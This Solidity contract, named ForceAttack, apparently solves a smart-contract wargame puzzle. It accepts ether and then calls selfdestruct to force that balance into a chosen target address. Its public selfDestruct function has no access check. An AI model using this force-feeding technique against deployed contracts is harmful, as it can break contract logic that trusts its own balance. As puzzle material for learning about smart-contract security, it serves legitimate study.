pragma solidity 0.6.0;

contract ForceAttack {
 
    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }
      
    function selfDestruct(address adr) public {
        selfdestruct(payable(adr));
    }

    receive() external payable {
    }
}